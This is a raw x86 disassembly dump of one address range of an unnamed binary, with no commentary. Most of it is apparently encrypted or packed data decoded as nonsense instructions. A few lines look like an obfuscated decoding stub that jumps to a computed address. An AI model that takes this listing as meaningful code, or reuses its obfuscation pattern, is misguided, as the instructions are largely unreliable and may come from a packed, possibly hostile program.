  416055:	(bad)  
  416056:	retf   0x627c
  416059:	inc    ecx
  41605a:	std    
  41605b:	pop    ds
  41605c:	jge    0x416075
  41605e:	in     eax,dx
  41605f:	int    0xf6
  416061:	mov    eax,ds:0x2266b6e3
  416066:	mov    eax,ds:0x3308558b
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416028
  41609a:	bound  edi,QWORD PTR ds:0x7f17ca0f
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416111
  4160a6:	push   esp
  4160a7:	js     0x4160f6
  4160a9:	mov    edx,0xf18b7a66
  4160ae:	mov    WORD PTR [edi-0x65],ss
  4160b1:	add    dh,dl
  4160b3:	out    0x57,al
  4160b5:	and    esp,DWORD PTR [ecx]
  4160b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b8:	ins    DWORD PTR es:[edi],dx
  4160b9:	mov    cl,0x44
  4160bb:	jae    0x41604b
  4160bd:	gs fsubr st(7),st
  4160c0:	push   DWORD PTR gs:[edx+esi*4]
  4160c4:	fild   QWORD PTR [eax]
  4160c6:	fisttp DWORD PTR ds:0x377be928
  4160cc:	lds    edi,FWORD PTR [edi]
  4160ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160cf:	sbb    bh,BYTE PTR [ebx+0x37]
  4160d2:	jg     0x416125
  4160d4:	call   0xaf9c0534
  4160d9:	cmp    ebx,DWORD PTR [esp+ecx*1]
  4160dc:	mov    edx,0x6a7c3c81
  4160e1:	or     eax,0x7855656b
  4160e6:	bound  edx,QWORD PTR [ecx+0x46]
  4160e9:	ss xor al,0x58
  4160ec:	cdq    
  4160ed:	cld    
  4160ee:	in     eax,dx
  4160ef:	mov    ebp,0x7327a8f1
  4160f4:	or     eax,0x870ebcf3
  4160f9:	ret    0x1dd4
  4160fc:	mov    al,0x34
  4160fe:	push   es
  4160ff:	inc    edx
  416100:	sub    eax,0xf8bbffe2
  416105:	jmp    0x3022a6d8
  41610a:	push   0x5f
  41610c:	neg    edi
  41610e:	iret   
  41610f:	les    ebp,FWORD PTR [ebp+0x9]
  416112:	gs nop
  416114:	xor    eax,DWORD PTR [ebp+0xcaf34bd]
  41611a:	sub    edi,edi
  41611c:	imul   ecx,DWORD PTR [esi-0x74],0xf4d19dfe
  416123:	pop    ds
  416124:	hlt    
  416125:	lock add DWORD PTR [ecx],ecx
  416128:	fwait
  416129:	cmp    al,bl
  41612b:	lods   al,BYTE PTR ds:[esi]
  41612c:	inc    edi
  41612d:	test   al,0xac
  41612f:	xchg   esi,eax
  416130:	mov    WORD PTR [esi+0x1b82afe7],fs
  416136:	scas   eax,DWORD PTR es:[edi]
  416137:	and    DWORD PTR [ecx-0x5362587f],ecx
  41613d:	or     al,0x98
  41613f:	inc    edx
  416140:	aam    0xd1
  416142:	adc    edi,DWORD PTR [edx]
  416144:	xchg   ebp,eax
  416145:	in     eax,0xd2
  416147:	ins    DWORD PTR es:[edi],dx
  416148:	stos   BYTE PTR es:[edi],al
  416149:	push   ebp
  41614a:	aam    0xeb
  41614c:	sti    
  41614d:	ret    
  41614e:	push   edx
  41614f:	pop    ecx
  416150:	shl    BYTE PTR [edi],cl
  416152:	das    
  416153:	jo     0x416153
  416155:	and    bl,bl
  416157:	call   0x12d6dd25
  41615c:	ins    BYTE PTR es:[edi],dx
  41615d:	fisub  WORD PTR [edi-0x7c32a032]
  416163:	sub    DWORD PTR [ecx-0x17],eax
  416166:	xchg   edx,eax
  416167:	mov    ebx,DWORD PTR [ebx+0x4f2859ba]
  41616d:	pushf  
  41616e:	pusha  
  41616f:	loopne 0x4161b7
  416171:	nop
  416172:	or     eax,0xbcbcde6e
  416177:	mov    ds:0x87359155,eax
  41617c:	into   
  41617d:	jecxz  0x416172
  41617f:	or     DWORD PTR [ebx],ebp
  416181:	adc    DWORD PTR [ebx-0x5d39724e],ebp
  416187:	fst    QWORD PTR [eax+0x5638d046]
  41618d:	in     eax,0x8a
  41618f:	pop    esp
  416190:	inc    eax
  416191:	and    bl,BYTE PTR [ecx-0x5d]
  416194:	aam    0xd3
  416196:	push   eax
  416197:	in     eax,0x6a
  416199:	push   ds
  41619a:	in     eax,0x6f
  41619c:	shl    DWORD PTR [edi+0x2e],0x82
  4161a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a1:	dec    eax
  4161a2:	or     eax,DWORD PTR [ebx-0x5f2331a7]
  4161a8:	in     eax,dx
  4161a9:	pop    ds
  4161aa:	xchg   esp,eax
  4161ab:	or     ebp,ebp
  4161ad:	mov    esi,0x93857192
  4161b2:	mov    ds:0x3b73f62b,al
  4161b7:	xchg   esi,eax
  4161b8:	pusha  
  4161b9:	sbb    BYTE PTR [eax+0x58],bl
  4161bc:	jp     0x4161d9
  4161be:	mov    ds:0x85145818,al
  4161c3:	test   DWORD PTR [ebp+0x75],esi
  4161c6:	js     0x416178
  4161c8:	fwait
  4161c9:	nop
  4161ca:	es pop ebp
  4161cc:	xchg   ebp,eax
  4161cd:	mov    BYTE PTR [ecx-0x1f],bh
  4161d0:	jmp    0x79439fb
  4161d5:	inc    edi
  4161d6:	add    DWORD PTR [eax+0x7e4b3599],0xfffffff0
  4161dd:	sub    esp,DWORD PTR [ebx+0x7]
  4161e0:	mov    DWORD PTR ds:0x2f609b90,esp
  4161e6:	cmp    edi,esp
  4161e8:	retf   0x397d
  4161eb:	and    ecx,ecx
  4161ed:	cli    
  4161ee:	add    BYTE PTR es:[ebx+0x6e],dh
  4161f2:	push   ebp
  4161f3:	je     0x4161ea
  4161f5:	repnz and BYTE PTR [ebp-0xa737ae3],cl
  4161fc:	cmp    BYTE PTR [ebp-0x7be24bc0],dh
  416202:	ins    BYTE PTR es:[edi],dx
  416203:	enter  0x32b,0x87
  416207:	out    dx,eax
  416208:	and    al,BYTE PTR [eax]
  41620a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41620b:	or     DWORD PTR [edx+0x24d98260],0xc0e61979
  416215:	test   eax,0xdc35b8
  41621a:	jne    0x416236
  41621c:	test   DWORD PTR [edi-0x5e],esi
  41621f:	push   ebx
  416220:	xchg   BYTE PTR [eax-0x3],bh
  416223:	pop    ecx
  416224:	(bad)  
  416225:	mov    BYTE PTR [ebx+0x64f02d32],dl
  41622b:	jmp    0xe3e9:0xb7780967
  416232:	js     0x4161d1
  416234:	pop    esp
  416235:	inc    edi
  416236:	dec    ebx
  416237:	outs   dx,DWORD PTR ds:[esi]
  416238:	ficomp DWORD PTR [esi-0x78]
  41623b:	into   
  41623c:	or     eax,0x32345c1c
  416241:	inc    ebp
  416242:	inc    ebp
  416243:	xchg   edi,eax
  416244:	loop   0x416228
  416246:	jno    0x4161e9
  416248:	jae    0x416276
  41624a:	cld    
  41624b:	mov    ebx,0x8e4a1580
  416250:	sub    ch,BYTE PTR [esi]
  416252:	sbb    ebp,0x960d4c2d
  416258:	aad    0xb7
  41625a:	cmp    eax,edx
  41625c:	mov    ss,ecx
  41625e:	rol    dh,0xbe
  416261:	mov    ds:0x54ee6ce3,eax
  416266:	mov    ecx,0xe512b825
  41626b:	dec    eax
  41626c:	(bad)  
  41626d:	out    0xe8,al
  41626f:	mov    edi,0xd2911be5
  416274:	rcr    DWORD PTR [esi-0x4ea02e72],1
  41627a:	cli    
  41627b:	jle    0x416207
  41627d:	add    esi,DWORD PTR [edi-0x4c6834e2]
  416283:	ds dec ebp
  416285:	push   0x37
  416287:	test   eax,0xde4faf0e
  41628c:	mov    al,0x6f
  41628e:	inc    ebp
  41628f:	sbb    cl,BYTE PTR [ebx]
  416291:	sbb    DWORD PTR [eax-0x80],esi
  416294:	push   cs
  416295:	test   BYTE PTR [eax],dl
  416297:	jnp    0x4162aa
  416299:	add    al,0x66
  41629b:	mov    esi,0xe9a74dc3
  4162a0:	xor    al,0xf
  4162a2:	cmc    
  4162a3:	retf   0x7f55
  4162a6:	scas   eax,DWORD PTR es:[edi]
  4162a7:	std    
  4162a8:	les    ebx,FWORD PTR [eax]
  4162aa:	vcmpneq_oqsd xmm6,xmm0,QWORD PTR [ecx+0xd]
  4162b0:	pop    esp
  4162b1:	repz into 
  4162b3:	rcl    BYTE PTR [eax],0xbe
  4162b6:	int    0xaf
  4162b8:	retf   
  4162b9:	pop    ss
  4162ba:	cli    
  4162bb:	xor    al,0xe0
  4162bd:	mov    al,0xaf
  4162bf:	add    DWORD PTR [edx-0x29],eax
  4162c2:	test   eax,0x84cf3360
  4162c7:	outs   dx,BYTE PTR ds:[esi]
  4162c8:	xchg   DWORD PTR [esi],ebp
  4162ca:	cmc    
  4162cb:	sbb    edx,0xffffff83
  4162ce:	pop    ebp
  4162cf:	cmp    dh,BYTE PTR [edi+0xcfb35bd]
  4162d5:	hlt    
  4162d6:	mov    es,WORD PTR [edx-0x5a]
  4162d9:	outs   dx,DWORD PTR ds:[esi]
  4162da:	adc    DWORD PTR [edx],eax
  4162dc:	xchg   ebp,eax
  4162dd:	and    dh,BYTE PTR [ecx+ecx*1-0x76164814]
  4162e4:	repnz lods eax,DWORD PTR ds:[esi]
  4162e6:	clc    
  4162e7:	xchg   ecx,eax
  4162e8:	ds pop ss
  4162ea:	lods   al,BYTE PTR ds:[esi]
  4162eb:	cwde   
  4162ec:	pushf  
  4162ed:	mov    ch,0xb7
  4162ef:	dec    BYTE PTR [edi+0x71]
  4162f2:	inc    esp
  4162f3:	add    dh,BYTE PTR [ebx+edx*4]
  4162f6:	jecxz  0x41630f
  4162f8:	mov    DWORD PTR [esi*8-0x1071f72d],edx
  4162ff:	or     BYTE PTR [eax],0x88
  416302:	or     edi,DWORD PTR [ecx+0x3f5ae6c5]
  416308:	mov    bl,BYTE PTR [esi-0x1fefaa67]
  41630e:	xchg   ebx,eax
  41630f:	pushf  
  416310:	inc    edx
  416311:	inc    ebp
  416312:	imul   edi,DWORD PTR [edi-0x5b83f5eb],0xa84c1cdf
  41631c:	shl    BYTE PTR [edx],0x20
  41631f:	aaa    
  416320:	addr16 pop ecx
  416322:	fcmovnb st,st(0)
  416324:	pop    ebx
  416325:	lahf   
  416326:	xchg   esi,eax
  416327:	popf   
  416328:	js     0x416331
  41632a:	rol    BYTE PTR [ecx],0x1d
  41632d:	icebp  
  41632e:	sahf   
  41632f:	dec    edx
  416330:	ins    BYTE PTR es:[edi],dx
  416331:	xchg   ecx,eax
  416332:	or     eax,0x1364fa8
  416337:	in     eax,0x19
  416339:	jns    0x4162dd
  41633b:	dec    esp
  41633c:	xlat   BYTE PTR ds:[ebx]
  41633d:	sbb    al,0xb2
  41633f:	les    ebp,FWORD PTR [ebp+0x41]
  416342:	cli    
  416343:	mov    edi,0x4b229dc3
  416348:	sub    al,0x63
  41634a:	cld    
  41634b:	pop    esp
  41634c:	xchg   ebx,eax
  41634d:	mov    cl,0x63
  41634f:	ins    BYTE PTR es:[edi],dx
  416350:	mov    eax,ds:0x19d5a5eb
  416355:	je     0x41635f
  416357:	fcmove st,st(2)
  416359:	add    BYTE PTR [esi-0x6a],0x74
  41635d:	sub    cl,cl
  41635f:	shl    ebx,1
  416361:	push   0x15e7dfe9
  416366:	cwde   
  416367:	hlt    
  416368:	xor    ecx,DWORD PTR [ebx]
  41636a:	cmc    
  41636b:	int    0x8b
  41636d:	dec    ebp
  41636e:	or     BYTE PTR [ebp+0x729c0a8c],cl
  416374:	xor    al,BYTE PTR [eax]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x2edac841
  4163bf:	aas    
  4163c0:	fst    QWORD PTR [ebx]
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163f3
  4163ca:	mov    eax,esi
  4163cc:	mov    bl,0xe0
  4163ce:	or     eax,0x1bd91a94
  4163d3:	in     al,dx
  4163d4:	mov    eax,ds:0x2ee5b844
  4163d9:	daa    
  4163da:	push   ss
  4163db:	cwde   
  4163dc:	stc    
  4163dd:	(bad)  
  4163de:	ins    DWORD PTR es:[edi],dx
  4163df:	lock test DWORD PTR [ecx],ebx
  4163e2:	cdq    
  4163e3:	add    DWORD PTR [edi-0x21890572],esp
  4163e9:	or     eax,DWORD PTR [esi-0xb155f2]
  4163ef:	or     BYTE PTR [eax],dl
  4163f1:	(bad)  
  4163f2:	not    DWORD PTR [edx]
  4163f4:	arpl   dx,cx
  4163f6:	or     ecx,DWORD PTR [esi]
  4163f8:	std    
  4163f9:	and    eax,0x78afd5af
  4163fe:	pop    esp
  4163ff:	xlat   BYTE PTR ds:[ebx]
  416400:	inc    esi
  416401:	scas   al,BYTE PTR es:[edi]
  416402:	shl    BYTE PTR [ebp-0x61],1
  416405:	dec    ebx
  416406:	or     BYTE PTR [ebx],dh
  416408:	mov    eax,ds:0x98435277
  41640d:	inc    BYTE PTR [edx+0x42]
  416410:	mov    edi,0x12483f9e
  416415:	add    eax,0xc2568957
  41641a:	test   BYTE PTR [ebp+0x61],ah
  41641d:	add    ch,bh
  41641f:	sub    DWORD PTR [esi+esi*1+0x7567ef8d],esp
  416426:	aaa    
  416427:	ins    DWORD PTR es:[edi],dx
  416428:	sbb    ah,BYTE PTR [eax]
  41642a:	xchg   edx,eax
  41642b:	ret    
  41642c:	push   ebx
  41642d:	inc    eax
  41642e:	mov    al,ds:0x8e38a31f
  416433:	fs jno 0x4164b1
  416436:	adc    dh,BYTE PTR [esi]
  416438:	test   eax,0x6ffc74c4
  41643d:	or     eax,0xb6af9d6d
  416442:	xchg   ebx,eax
  416443:	fwait
  416444:	aam    0x89
  416446:	cmp    eax,0x45638b16
  41644b:	jmp    0x76aed169
  416450:	sbb    al,0xc0
  416452:	pop    ds
  416453:	nop
  416454:	dec    edi
  416455:	and    BYTE PTR [edi],0x2
  416458:	imul   esi,DWORD PTR [esi-0x4c],0xb62e057
  41645f:	xor    edx,eax
  416461:	xchg   edi,edi
  416463:	rcr    DWORD PTR [edi],cl
  416465:	inc    esi
  416466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416467:	push   ebp
  416468:	rcl    BYTE PTR [esi-0x3],1
  41646b:	push   eax
  41646c:	push   edx
  41646d:	mov    edi,0x11137ed6
  416472:	cmp    DWORD PTR [edi],ebx
  416474:	inc    ebx
  416475:	setb   BYTE PTR [eax+eiz*4-0x5d5d9020]
  41647d:	ins    DWORD PTR es:[edi],dx
  41647e:	sbb    DWORD PTR [edi+0x31b344e7],esp
  416484:	cmp    cl,BYTE PTR [eax+eiz*4+0x6724434f]
  41648b:	jns    0x41648e
  41648d:	xor    al,0x6f
  41648f:	clc    
  416490:	cld    
  416491:	test   DWORD PTR [edi+0x24],0x325f7ad0
  416498:	cs in  al,0x75
  41649b:	push   edi
  41649c:	mov    esi,DWORD PTR [edi+ecx*2]
  41649f:	push   edx
  4164a0:	add    al,BYTE PTR ds:0x1d54f7de
  4164a6:	call   0x9337:0x424dec60
  4164ad:	pop    es
  4164ae:	push   edi
  4164af:	das    
  4164b0:	push   edi
  4164b1:	call   0x2003:0xa8476525
  4164b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b9:	data16 js 0x4164cc
  4164bc:	sbb    ebp,DWORD PTR [esi+0x555d69fa]
  4164c2:	mov    eax,db4
  4164c5:	into   
  4164c6:	repnz pop eax
  4164c8:	imul   eax,ebp,0xffffff8e
  4164cb:	and    bl,BYTE PTR [esi]
  4164cd:	int    0xab
  4164cf:	pop    eax
  4164d0:	xchg   ebp,ebp
  4164d2:	dec    edi
  4164d3:	mov    ah,BYTE PTR [edi+0x26]
  4164d6:	inc    ebp
  4164d7:	jg     0x41654c
  4164d9:	mov    DWORD PTR [edx+eiz*8+0x2d4bcd0e],0xbbfa5ef5
  4164e4:	rol    cl,0x18
  4164e7:	sub    BYTE PTR [edx-0x44],bl
  4164ea:	cmp    al,0xe
  4164ec:	das    
  4164ed:	push   ebp
  4164ee:	pusha  
  4164ef:	mov    ah,0xd9
  4164f1:	xchg   ebp,eax
  4164f2:	repnz scas al,BYTE PTR es:[edi]
  4164f4:	pop    ds
  4164f5:	cwde   
  4164f6:	aad    0x22
  4164f8:	ins    DWORD PTR es:[edi],dx
  4164f9:	mov    ecx,0x130f089f
  4164fe:	pop    ds
  4164ff:	rcl    cl,0x1d
  416502:	push   esi
  416503:	sub    cl,ch
  416505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416506:	mov    al,ds:0xd017caf8
  41650b:	add    al,0x80
  41650d:	jo     0x4164cd
  41650f:	out    0x4d,eax
  416511:	xchg   esi,eax
  416512:	mov    ss,WORD PTR [edi]
  416514:	cli    
  416515:	mov    eax,DWORD PTR [ebx+0x48]
  416518:	inc    edx
  416519:	push   edx
  41651a:	jge    0x416590
  41651c:	ins    BYTE PTR es:[edi],dx
  41651d:	xor    dl,0xfa
  416520:	sub    al,0x3f
  416522:	rcr    DWORD PTR [eax+0x0],1
  416525:	ja     0x4164f0
  416527:	add    al,0x46
  416529:	xchg   ecx,eax
  41652a:	imul   edx,DWORD PTR [eax+0x2d],0x12
  41652e:	push   ds
  41652f:	sub    bh,dh
  416531:	fmulp  st(5),st
  416533:	jmp    0x41650b
  416535:	add    al,0x6f
  416537:	mov    dh,0xbc
  41653a:	ins    DWORD PTR es:[edi],dx
  41653b:	aad    0x1
  41653d:	mov    ds:0xc2bd84db,eax
  416542:	add    edx,DWORD PTR [ebx]
  416544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416545:	jmp    0x22a39d02
  41654a:	mov    dl,0x43
  41654c:	and    esi,DWORD PTR [edx+0x2e05fcd4]
  416552:	cld    
  416553:	pop    ecx
  416554:	icebp  
  416555:	fild   WORD PTR ds:0x28610ec1
  41655b:	scas   eax,DWORD PTR es:[edi]
  41655c:	call   0x14f6:0x51aaeee7
  416563:	adc    esi,ebx
  416565:	push   cs
  416566:	adc    BYTE PTR [edx+0x3c5fbf30],ah
  41656c:	and    dl,BYTE PTR [ebp-0x7]
  41656f:	pop    ebp
  416570:	lods   eax,DWORD PTR ds:[esi]
  416571:	out    dx,eax
  416572:	mov    ds:0xe5f47908,eax
  416577:	fisub  WORD PTR [ecx-0x25952fe1]
  41657d:	test   BYTE PTR [ecx],dl
  41657f:	adc    eax,0x42bb5c1d
  416584:	jg     0x416588
  416586:	dec    edi
  416587:	ds xchg esp,eax
  416589:	inc    ebp
  41658a:	ins    DWORD PTR es:[edi],dx
  41658b:	add    esi,eax
  41658d:	push   eax
  41658e:	mov    bh,0x30
  416590:	and    dl,dl
  416592:	ret    0x547a
  416595:	xor    al,0xc4
  416597:	pop    ecx
  416598:	and    DWORD PTR [eax],ebp
  41659a:	mov    esp,0x7f28da6a
  41659f:	lods   al,BYTE PTR ds:[esi]
  4165a0:	lgs    edx,FWORD PTR [esp+edi*8+0x3f]
  4165a5:	outs   dx,DWORD PTR ds:[esi]
  4165a6:	(bad)  
  4165a7:	cld    
  4165a8:	inc    edx
  4165a9:	inc    ebx
  4165aa:	sub    DWORD PTR [ebx],ecx
  4165ac:	pop    ss
  4165ad:	stos   BYTE PTR es:[edi],al
  4165ae:	adc    DWORD PTR [eax-0x78],edx
  4165b1:	and    ch,BYTE PTR [edx+0x609b6e82]
  4165b7:	sahf   
  4165b8:	push   0x4e7bc904
  4165bd:	push   ebx
  4165be:	out    dx,eax
  4165bf:	inc    ecx
  4165c0:	adc    ebx,ebp
  4165c2:	xor    cl,BYTE PTR ds:0x5be7bc49
  4165c8:	xchg   ebp,eax
  4165c9:	data16 ds sbb al,0x0
  4165cd:	das    
  4165ce:	test   BYTE PTR [eax],dh
  4165d0:	pop    es
  4165d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165d2:	iret   
  4165d3:	jnp    0x4165d5
  4165d5:	mov    al,ds:0x140dce16
  4165da:	jo     0x4165dd
  4165dc:	(bad)  
  4165dd:	pop    eax
  4165de:	fldenv [eax+0x64]
  4165e1:	out    dx,eax
  4165e2:	sahf   
  4165e3:	add    DWORD PTR [edx+0x6dc91cc2],esp
  4165e9:	mov    ds:0xeea8601,eax
  4165ee:	cmp    DWORD PTR [eax],0xffffffbc
  4165f1:	int    0xb8
  4165f3:	adc    BYTE PTR [edx-0x72],ch
  4165f6:	add    esi,DWORD PTR [edx+0x6ed39cf6]
  4165fc:	cmp    al,0x8d
  4165fe:	hlt    
  4165ff:	(bad)  
  416600:	ds ffree st(3)
  416603:	out    0x1d,eax
  416605:	xchg   edx,eax
  416606:	or     bl,0x72
  416609:	test   al,0xc1
  41660b:	and    al,BYTE PTR [ebx-0x6b]
  41660e:	idiv   BYTE PTR [eax+0x30]
  416611:	pop    esp
  416612:	pop    ebx
  416613:	lea    edx,[ecx]
  416615:	test   BYTE PTR [esi-0x1303baa5],bl
  41661b:	out    0x95,al
  41661d:	repz fcomp DWORD PTR [ebp-0x130d4b98]
  416624:	xor    ch,BYTE PTR [ebx]
  416626:	mov    BYTE PTR [eax],0xa8
  416629:	in     eax,0x3a
  41662b:	ret    
  41662c:	das    
  41662d:	fld    TBYTE PTR [edi-0x2e9fe688]
  416633:	lods   eax,DWORD PTR ds:[esi]
  416634:	imul   esp,ecx,0x54584302
  41663a:	stc    
  41663b:	ret    
  41663c:	aam    0xad
  41663e:	cdq    
  41663f:	sti    
  416640:	pop    eax
  416641:	inc    esi
  416642:	push   ecx
  416643:	lods   eax,DWORD PTR ds:[esi]
  416644:	inc    edx
  416645:	out    dx,eax
  416646:	addr16 (bad) 
  416648:	dec    esp
  416649:	mov    al,ds:0x79a92b70
  41664e:	mov    eax,0xf5bb85ca
  416653:	fisttp WORD PTR [ecx-0x6c0a5792]
  416659:	sahf   
  41665a:	push   0x48
  41665c:	push   ds
  41665d:	pop    ecx
  41665e:	cmp    DWORD PTR [esi+0xc919ead],edx
  416664:	push   0x79
  416666:	test   eax,0xf14619c0
  41666b:	and    DWORD PTR [eax-0x1b],ebp
  41666e:	sub    cl,BYTE PTR [ecx+0x69c5a115]
  416674:	call   0x770e7f10
  416679:	sub    ebx,DWORD PTR [eax]
  41667b:	mov    ecx,0xdaa2a829
  416680:	psubsb mm6,QWORD PTR [edx-0x327ab828]
  416687:	scas   eax,DWORD PTR es:[edi]
  416688:	out    0x7c,al
  41668a:	(bad)  
  41668b:	sub    DWORD PTR [ebx],eax
  41668d:	ret    0xca85
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416698
  4166ae:	cli    
  4166af:	lds    esp,FWORD PTR [eax]
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x5070707e
  4166ba:	add    cl,BYTE PTR ss:[edx+0x1af4a3b2]
  4166c1:	icebp  
  4166c2:	nop
  4166c3:	or     BYTE PTR [edx],cl
  4166c5:	add    esp,eax
  4166c7:	fimul  WORD PTR [eax+0x10b7b2e9]
  4166cd:	push   ecx
  4166ce:	pusha  
  4166cf:	jb     0x416673
  4166d1:	out    dx,eax
  4166d2:	ror    DWORD PTR [edx+0x5c4e5690],1
  4166d8:	adc    eax,0x4eb7cd94
  4166dd:	mov    edx,0xe45f0415
  4166e2:	arpl   WORD PTR [esi],bx
  4166e4:	mov    BYTE PTR [ecx-0x222e17d6],ch
  4166ea:	sub    eax,DWORD PTR [ebp-0x748524c8]
  4166f0:	cld    
  4166f1:	mov    dh,0x58
  4166f3:	test   DWORD PTR ss:[esi+0x7cc47ab4],esi
  4166fa:	je     0x4166ac
  4166fc:	cli    
  4166fd:	addr16 xchg ebx,eax
  4166ff:	adc    DWORD PTR [edx*1+0x31cd9c6b],eax
  416706:	scas   eax,DWORD PTR es:[edi]
  416707:	sub    edx,DWORD PTR [esi+0x31bfdfc3]
  41670d:	icebp  
  41670e:	imul   esp,DWORD PTR [ebp-0x557e4196],0xffffffcf
  416715:	jg     0x4166b6
  416717:	fldenv [esi]
  416719:	les    esi,FWORD PTR [esi-0xc]
  41671c:	jbe    0x4166ad
  41671e:	sub    eax,0xa1bd2148
  416723:	jns    0x416732
  416725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416726:	or     bl,dh
  416728:	(bad)  
  416729:	xchg   ebp,eax
  41672a:	lds    ecx,FWORD PTR [edx]
  41672c:	test   DWORD PTR [edx-0x50],eax
  41672f:	jg     0x41679f
  416731:	gs cmp al,0xc7
  416734:	jmp    0x41678f
  416736:	fcom   DWORD PTR [ebx]
  416738:	mov    ds:0xf5dc1be8,al
  41673d:	jnp    0x416786
  41673f:	dec    ecx
  416740:	sub    BYTE PTR [esi+edx*2],bl
  416743:	dec    ebx
  416744:	call   DWORD PTR [edi+esi*2+0x6d7017ff]
  41674b:	std    
  41674c:	mov    WORD PTR [ecx+eax*1-0x8],gs
  416750:	wrmsr  
  416752:	retf   
  416753:	adc    DWORD PTR [esi-0x6f1818cc],0x888f92ab
  41675d:	add    BYTE PTR [edi+esi*8-0x57],ah
  416761:	pop    ss
  416762:	into   
  416763:	packuswb mm5,QWORD PTR [edx+0x6]
  416767:	jl     0x4166f9
  416769:	xchg   esi,eax
  41676a:	and    BYTE PTR [ebx],bl
  41676c:	leave  
  41676d:	js     0x416766
  41676f:	pop    esi
  416770:	inc    edi
  416771:	(bad)  
  416772:	fdivr  st(2),st
  416774:	pop    ecx
  416775:	pop    esp
  416776:	popf   
  416777:	push   ebx
  416778:	(bad)  
  416779:	mov    esi,0x90feafdf
  41677e:	ins    BYTE PTR es:[edi],dx
  41677f:	and    eax,0xad4037b6
  416784:	add    al,0x6a
  416786:	jae    0x416768
  416788:	inc    edx
  416789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41678a:	sbb    dh,BYTE PTR [esi+edx*1-0xf]
  41678e:	and    al,0xe3
  416790:	test   DWORD PTR ss:[edi],ebx
  416793:	repnz push edi
  416795:	retf   
  416796:	or     DWORD PTR [eax-0x66],edi
  416799:	(bad)  
  41679a:	xor    bh,BYTE PTR [edi+ebx*8]
  41679d:	in     eax,0x9a
  41679f:	std    
  4167a0:	sbb    eax,0x4aed2abc
  4167a5:	and    BYTE PTR [eax+0x4d6c851f],0x17
  4167ac:	or     BYTE PTR [edi],bh
  4167ae:	hlt    
  4167af:	and    BYTE PTR [edi],0xc3
  4167b2:	daa    
  4167b3:	mov    edx,0xddeb33c3
  4167b8:	out    dx,eax
  4167b9:	fist   DWORD PTR [ecx]
  4167bb:	mov    ebp,0x8fc26df0
  4167c0:	push   eax
  4167c1:	std    
  4167c2:	push   edx
  4167c3:	jg     0x416793
  4167c5:	ficomp WORD PTR [edx-0x677cfd98]
  4167cb:	(bad)  
  4167cc:	ins    DWORD PTR es:[edi],dx
  4167cd:	add    BYTE PTR [edx],dl
  4167cf:	pop    ebx
  4167d0:	push   ds
  4167d1:	or     BYTE PTR [eax-0x616513fd],dh
  4167d7:	sub    al,0xc0
  4167d9:	adc    al,0xc7
  4167db:	jbe    0x4167f2
  4167dd:	push   esp
  4167de:	stc    
  4167df:	xor    esi,DWORD PTR [esi+ebx*4+0x2c3fab3d]
  4167e6:	dec    ebx
  4167e7:	jno    0x41683c
  4167e9:	cwde   
  4167ea:	in     eax,0x4
  4167ec:	fst    st(7)
  4167ee:	xchg   ecx,eax
  4167ef:	jnp    0x4167c7
  4167f1:	xchg   cx,ax
  4167f3:	nop
  4167f4:	adc    edi,eax
  4167f6:	call   0x2f79:0x6bf52dd9
  4167fd:	lea    edx,ds:0xa351fa25
  416803:	inc    esi
  416804:	push   ecx
  416805:	inc    edx
  416806:	ins    DWORD PTR es:[edi],dx
  416807:	add    eax,0x82c5f55d
  41680c:	outs   dx,BYTE PTR ds:[esi]
  41680d:	mov    dh,BYTE PTR [edx+ebp*2-0x739edf20]
  416814:	nop
  416815:	fisttp WORD PTR [edx+0x1d]
  416818:	leave  
  416819:	sub    eax,0x2e3b81ee
  41681e:	mov    eax,0xeb339a2b
  416823:	mov    DWORD PTR [edi-0x4e],0x203545c7
  41682a:	or     ebx,DWORD PTR [ebp-0x654ce917]
